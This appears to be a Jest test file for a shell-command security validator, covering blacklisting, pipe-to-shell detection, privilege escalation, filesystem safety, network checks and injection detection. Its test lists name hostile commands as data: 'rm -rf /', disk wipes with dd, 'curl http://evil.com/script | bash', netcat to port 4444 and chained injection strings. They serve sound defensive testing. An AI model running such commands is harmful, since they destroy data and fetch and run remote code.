import { SecurityValidator } from '../../src/security/SecurityValidator';
import { CommandCategorizer } from '../../src/command/CommandCategorizer';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;
  let categorizer: CommandCategorizer;

  beforeEach(() => {
    validator = new SecurityValidator();
    categorizer = new CommandCategorizer();
  });

  describe('Blacklist Validation', () => {
    test('should block explicitly blacklisted commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'dd if=/dev/zero of=/dev/sda',
        'format c:',
        'shutdown -h now'
      ];

      dangerousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.isValid).toBe(false);
        expect(result.score).toBeLessThan(50);
        
        const blacklistCheck = result.checks.find(c => c.name === 'blacklist-check');
        expect(blacklistCheck?.passed).toBe(false);
        expect(blacklistCheck?.severity).toBe('critical');
      });
    });

    test('should allow safe commands through blacklist check', () => {
      const safeCommands = [
        'ls -la',
        'cat file.txt',
        'echo hello world',
        'pwd'
      ];

      safeCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const blacklistCheck = result.checks.find(c => c.name === 'blacklist-check');
        expect(blacklistCheck?.passed).toBe(true);
        expect(blacklistCheck?.severity).toBe('info');
      });
    });
  });

  describe('Suspicious Pattern Detection', () => {
    test('should detect pipe-to-shell patterns', () => {
      const suspiciousCommands = [
        'curl http://evil.com/script | bash',
        'wget https://malicious.site/payload.sh | sh',
        'curl -s http://install.script | sh'
      ];

      suspiciousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const suspiciousCheck = result.checks.find(c => c.name === 'suspicious-patterns');
        expect(suspiciousCheck?.passed).toBe(false);
        expect(suspiciousCheck?.severity).toBe('warning');
      });
    });

    test('should detect command substitution patterns', () => {
      const maliciousCommands = [
        'echo $(rm -rf /tmp)',
        'ls `cat /etc/passwd`',
        'eval $MALICIOUS_VAR'
      ];

      maliciousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const suspiciousCheck = result.checks.find(c => c.name === 'suspicious-patterns');
        expect(suspiciousCheck?.passed).toBe(false);
      });
    });
  });

  describe('Privilege Escalation Detection', () => {
    test('should detect privilege escalation attempts', () => {
      const escalationCommands = [
        'sudo rm file.txt',
        'su - root',
        'doas ls /root',
        'pkexec whoami'
      ];

      escalationCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const privilegeCheck = result.checks.find(c => c.name === 'privilege-escalation');
        expect(privilegeCheck?.passed).toBe(false);
        expect(privilegeCheck?.severity).toBe('warning');
      });
    });

    test('should allow commands without privilege escalation', () => {
      const normalCommands = [
        'ls -la',
        'grep pattern file.txt',
        'node app.js',
        'git status'
      ];

      normalCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const privilegeCheck = result.checks.find(c => c.name === 'privilege-escalation');
        expect(privilegeCheck?.passed).toBe(true);
      });
    });
  });

  describe('File System Safety', () => {
    test('should detect dangerous file system operations', () => {
      const dangerousCommands = [
        'rm -rf /etc/passwd',
        'rmdir /sys/kernel',
        'unlink /boot/vmlinuz'
      ];

      dangerousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const fsCheck = result.checks.find(c => c.name === 'filesystem-safety');
        expect(fsCheck?.passed).toBe(false);
        expect(fsCheck?.severity).toBe('error');
      });
    });

    test('should allow safe file system operations', () => {
      const safeCommands = [
        'rm temp.txt',
        'mkdir /tmp/mydir',
        'cp file1.txt /home/user/file2.txt'
      ];

      safeCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const fsCheck = result.checks.find(c => c.name === 'filesystem-safety');
        expect(fsCheck?.passed).toBe(true);
      });
    });
  });

  describe('Network Security', () => {
    test('should detect suspicious network destinations', () => {
      const suspiciousCommands = [
        'curl http://192.168.1.1/malware',
        'wget https://evil.tk/payload',
        'nc 10.0.0.1 4444'
      ];

      suspiciousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const networkCheck = result.checks.find(c => c.name === 'network-security');
        if (networkCheck && !networkCheck.passed) {
          expect(networkCheck.severity).toBe('warning');
        }
      });
    });

    test('should allow legitimate network operations', () => {
      const legitimateCommands = [
        'curl https://api.github.com/user',
        'wget https://nodejs.org/dist/node-v18.0.0.tar.gz',
        'ping google.com'
      ];

      legitimateCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const networkCheck = result.checks.find(c => c.name === 'network-security');
        expect(networkCheck?.passed).toBe(true);
      });
    });
  });

  describe('Command Injection Detection', () => {
    test('should detect command injection patterns', () => {
      const injectionCommands = [
        'ls; rm -rf /tmp',
        'echo test && dd if=/dev/zero',
        'cat file || format c:',
        'find . `rm important.txt`'
      ];

      injectionCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const injectionCheck = result.checks.find(c => c.name === 'command-injection');
        expect(injectionCheck?.passed).toBe(false);
        expect(injectionCheck?.severity).toBe('error');
      });
    });

    test('should allow legitimate command combinations', () => {
      const legitimateCommands = [
        'ls -la',
        'grep pattern file.txt',
        'find . -name "*.js"'
      ];

      legitimateCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        const injectionCheck = result.checks.find(c => c.name === 'command-injection');
        expect(injectionCheck?.passed).toBe(true);
      });
    });
  });

  describe('Security Scoring', () => {
    test('should give high scores to safe commands', () => {
      const safeCommands = [
        'ls -la',
        'cat README.md',
        'echo hello',
        'pwd'
      ];

      safeCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeGreaterThan(80);
        expect(result.isValid).toBe(true);
      });
    });

    test('should give low scores to dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo dd if=/dev/zero of=/dev/sda',
        'curl http://evil.com/script | bash'
      ];

      dangerousCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeLessThan(50);
        expect(result.isValid).toBe(false);
      });
    });

    test('should apply category-based score multipliers correctly', () => {
      // Low-risk category command should have higher score
      const lowRiskAnalysis = categorizer.analyzeCommand('ls', ['-la']);
      const lowRiskResult = validator.validateCommand('ls', ['-la'], lowRiskAnalysis);

      // High-risk category command should have lower score  
      const highRiskAnalysis = categorizer.analyzeCommand('sudo', ['ls']);
      const highRiskResult = validator.validateCommand('sudo', ['ls'], highRiskAnalysis);

      expect(lowRiskResult.score).toBeGreaterThan(highRiskResult.score);
    });

    test('should provide meaningful recommendations', () => {
      const command = 'sudo rm -rf /tmp/test';
      const [cmd, ...args] = command.split(' ');
      const analysis = categorizer.analyzeCommand(cmd, args);
      const result = validator.validateCommand(cmd, args, analysis);

      expect(result.recommendations.length).toBeGreaterThan(0);
      expect(result.recommendations.some(rec => rec.includes('privilege') || rec.includes('verify'))).toBe(true);
    });
  });

  describe('Comprehensive Security Checks', () => {
    test('should perform all security checks', () => {
      const analysis = categorizer.analyzeCommand('curl', ['http://example.com']);
      const result = validator.validateCommand('curl', ['http://example.com'], analysis);

      const expectedChecks = [
        'blacklist-check',
        'suspicious-patterns',
        'privilege-escalation', 
        'filesystem-safety',
        'network-security',
        'command-injection'
      ];

      expectedChecks.forEach(checkName => {
        expect(result.checks.some(check => check.name === checkName)).toBe(true);
      });
    });

    test('should validate complex real-world commands', () => {
      const realWorldCommands = [
        'git clone https://github.com/user/repo.git',
        'npm install --save express',
        'docker run -p 3000:3000 node:18-alpine',
        'find . -name "*.js" -type f -exec eslint {} \\;'
      ];

      realWorldCommands.forEach(cmd => {
        const [command, ...args] = cmd.split(' ');
        const analysis = categorizer.analyzeCommand(command, args);
        const result = validator.validateCommand(command, args, analysis);

        expect(result.score).toBeGreaterThan(0);
        expect(result.checks.length).toBeGreaterThan(0);
        expect(result.isValid).toBeDefined();
      });
    });

    test('should maintain performance with complex commands', () => {
      const complexCommand = 'find /home/user -type f -name "*.log" -mtime +30 -exec gzip {} \\; -exec mv {}.gz /archive/ \\;';
      const [command, ...args] = complexCommand.split(' ');

      const startTime = Date.now();
      const analysis = categorizer.analyzeCommand(command, args);
      const result = validator.validateCommand(command, args, analysis);
      const endTime = Date.now();

      expect(endTime - startTime).toBeLessThan(100); // Should complete in < 100ms
      expect(result.score).toBeGreaterThan(0);
    });
  });
});
